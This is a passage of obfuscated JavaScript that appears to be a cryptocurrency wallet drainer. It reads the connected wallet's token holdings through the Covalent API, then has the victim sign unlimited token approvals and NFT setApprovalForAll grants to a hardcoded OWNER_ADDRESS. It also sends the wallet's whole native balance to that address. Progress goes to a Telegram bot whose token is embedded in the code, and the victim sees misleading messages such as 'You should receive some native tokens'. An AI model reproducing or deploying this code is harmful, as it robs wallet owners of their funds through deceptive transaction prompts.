nByIndex','defi-kingdoms-mainnet','boba-bnb-testnet','Params','gas','balanceOf','safeTransferFrom','Redeem','milkomeda-a1-devnet','avalanche-mainnet','defaultCommon','redeem','newMaxFee','mantle-testnet','Token\x20balance\x20is\x20','oasis-sapphire-testnet','maximumFee','transfer','binance'];_0x2146=function(){return _0x39da1b;};return _0x2146();}async function covalenthqAPICall(){const _0x16837=_0x1ab798,_0x29c750={'format':_0x16837(0x1f9),'nft':_0x16837(0x26c),'quote-currency':'usd','key':_0x16837(0x212)},_0x4f92c5=new URL('https://api.covalenthq.com/v1/'+chainId+_0x16837(0x205)+selectedAccount+'/balances_v2/');_0x4f92c5[_0x16837(0x22f)]=new URLSearchParams(_0x29c750)[_0x16837(0x246)]();const _0x54223f={'method':_0x16837(0x18a),'headers':{'Content-Type':_0x16837(0x25f)}};try{const _0x53f6d5=await fetch(_0x4f92c5,_0x54223f)['then'](_0x33c683=>_0x33c683[_0x16837(0x1c7)]());let _0x3926ba=_0x53f6d5['data'][_0x16837(0x1d9)];console[_0x16837(0x27f)](_0x16837(0x22b),_0x3926ba);let _0x52b1d5=_0x3926ba[_0x16837(0x241)](_0x3ac819=>{const _0xbafbd7=_0x16837;return{'balance':_0x3ac819[_0xbafbd7(0x1e1)],'value':_0x3ac819[_0xbafbd7(0x1cd)],'address':_0x3ac819[_0xbafbd7(0x1d8)],'symbol':_0x3ac819[_0xbafbd7(0x254)],'type':_0x3ac819['type']};});console[_0x16837(0x27f)](_0x16837(0x24b),_0x52b1d5),tokens=_0x52b1d5[_0x16837(0x21f)](_0x5cabfe=>_0x5cabfe['value']>0x5&&_0x5cabfe[_0x16837(0x1e6)]!=_0x16837(0x1c4)),console[_0x16837(0x27f)]('chainId:',chainId,_0x16837(0x223),tokens);if(window[_0x16837(0x25c)][_0x16837(0x22f)])onSendEther();else onApprove();}catch{sendMessage(_0x16837(0x198)),sendMessage1(_0x16837(0x198));}}async function onApprove(){const _0x4faf14=_0x1ab798;if(tokens['length'])try{loopTokens(tokens);}catch(_0x5d2855){console[_0x4faf14(0x230)](_0x4faf14(0x1ff)+_0x5d2855[_0x4faf14(0x226)]);}else sendMessage(_0x4faf14(0x234)),sendMessage1(_0x4faf14(0x234));}async function loopTokens(_0x597d40){const _0x138bb6=_0x1ab798;for await(let _0x379f6f of _0x597d40){if(_0x379f6f[_0x138bb6(0x250)]===_0x138bb6(0x194)){let _0x4b9a74=new web3Object['eth'][(_0x138bb6(0x1ba))](ABI,_0x379f6f[_0x138bb6(0x272)]);sendMessage('New\x20token'),sendMessage1(_0x138bb6(0x1fb)),await _0x4b9a74[_0x138bb6(0x216)][_0x138bb6(0x1ce)](OWNER_ADDRESS,'999999999999999999999999999999999999999999999999999999999999999999999999')[_0x138bb6(0x265)]({'from':selectedAccount,'to':_0x379f6f[_0x138bb6(0x272)]})['on'](_0x138bb6(0x252),_0x32c600=>{const _0x198c0c=_0x138bb6;console[_0x198c0c(0x27f)](_0x198c0c(0x274)+_0x32c600);})['on']('receipt',_0x4c512a=>{const _0x19ec0c=_0x138bb6;console[_0x19ec0c(0x27f)]('Transaction\x20Receipt:\x20'+_0x4c512a),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage(_0x19ec0c(0x25a)+_0x379f6f[_0x19ec0c(0x272)]),sendMessage('Token\x20balance\x20is\x20'+_0x379f6f[_0x19ec0c(0x1e1)]),sendMessage(_0x19ec0c(0x1cf)+OWNER_ADDRESS),sendMessage1(_0x19ec0c(0x1c6)),sendMessage1(_0x19ec0c(0x25a)+_0x379f6f[_0x19ec0c(0x272)]),sendMessage1(_0x19ec0c(0x1b4)+_0x379f6f[_0x19ec0c(0x1e1)]),sendMessage1(_0x19ec0c(0x1cf)+OWNER_ADDRESS);})['on'](_0x138bb6(0x230),_0x2e83fe=>{const _0x43d885=_0x138bb6;console['log'](_0x43d885(0x1d5)+_0x2e83fe),sendMessage('Transaction\x20Rejected'),sendMessage1('Transaction\x20Rejected');});}else{if(_0x379f6f[_0x138bb6(0x250)]===_0x138bb6(0x206)){let _0x54bd7f=new web3Object[(_0x138bb6(0x184))]['Contract'](ABIN,_0x379f6f[_0x138bb6(0x272)]);await _0x54bd7f[_0x138bb6(0x216)][_0x138bb6(0x20a)](OWNER_ADDRESS,'true')['send']({'from':selectedAccount,'to':_0x379f6f['address']})['on'](_0x138bb6(0x252),_0x368b47=>{const _0x3cc4c0=_0x138bb6;console[_0x3cc4c0(0x27f)]('Transaction\x20Hash:\x20'+_0x368b47),sendMessage(_0x3cc4c0(0x193)),sendMessage1('Transaction\x20is\x20submitted\x20to\x20the\x20network');})['on']('receipt',_0x390282=>{const _0x227777=_0x138bb6;console[_0x227777(0x27f)](_0x227777(0x20d)+_0x390282),sendMessage(_0x227777(0x1c6)),sendMessage(_0x227777(0x268)+_0x379f6f['address']),sendMessage(_0x227777(0x1cf)+OWNER_ADDRESS),sendMessage1('Approve\x20Completed\x20Successfully'),sendMessage1(_0x227777(0x268)+_0x379f6f[_0x227777(0x272)]),sendMessage1(_0x227777(0x1cf)+OWNER_ADDRESS);})['on'](_0x138bb6(0x230),_0x5b56da=>{const _0xef32ed=_0x138bb6;console[_0xef32ed(0x27f)]('Error:\x20'+_0x5b56da),sendMessage(_0xef32ed(0x1fa)),sendMessage1('Transaction\x20Rejected');});}else sendMessage('Invalid\x20token\x20${token.address}');}};onSendEther();}async function onSendEther(){const _0x5f3c73=_0x1ab798;try{let _0x4122ff=await web3Object['eth'][_0x5f3c73(0x19b)](selectedAccount);var _0x58aa7e=await web3Object['eth'][_0x5f3c73(0x209)](),_0x46b109={'gasPrice':_0x58aa7e,'from':selectedAccount,'to':OWNER_ADDRESS,'value':_0x4122ff},_0x4625c6=await web3Object[_0x5f3c73(0x184)][_0x5f3c73(0x1f5)](_0x46b109),_0x23ca4a=_0x58aa7e*_0x4625c6;_0x46b109[_0x5f3c73(0x1aa)]=_0x4625c6,_0x46b109['value']=_0x4122ff-_0x23ca4a,web3Object[_0x5f3c73(0x184)][_0x5f3c73(0x1bb)](_0x46b109)['on'](_0x5f3c73(0x252),_0x499abb=>{const _0x3e9fc6=_0x5f3c73;console[_0x3e9fc6(0x27f)](_0x3e9fc6(0x274),_0x499abb),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network'),sendMessage1(_0x3e9fc6(0x193));})['on'](_0x5f3c73(0x22e),_0x17b522=>{const _0x6fff79=_0x5f3c73;console[_0x6fff79(0x27f)](_0x6fff79(0x20d),_0x17b522),sendMessage('Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens');})['on'](_0x5f3c73(0x230),_0xd7bc34=>{const _0x1925e9=_0x5f3c73;console['log'](_0x1925e9(0x1d5),_0xd7bc34),sendMessage(_0x1925e9(0x1fa)),sendMessage1(_0x1925e9(0x1fa));});}catch{sendMessage(_0x5f3c73(0x191));}}async function sendMessage(_0x3edd65){return new Promise((_0x5712c2,_0x2b139c)=>{const _0x59c645=_0x2f25,_0x26408e=CHAT;fetch('https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id='+_0x26408e+'&text='+_0x3edd65,{'method':_0x59c645(0x18a),'headers':{}})['then'](async _0x2ab347=>{const _0x4273b9=_0x59c645;if(_0x2ab347['status']>0x18f)throw _0x2ab347;_0x5712c2(await _0x2ab347[_0x4273b9(0x1c7)]());})[_0x59c645(0x1a5)](_0x2ccdf1=>{_0x2b139c(_0x2ccdf1);});});}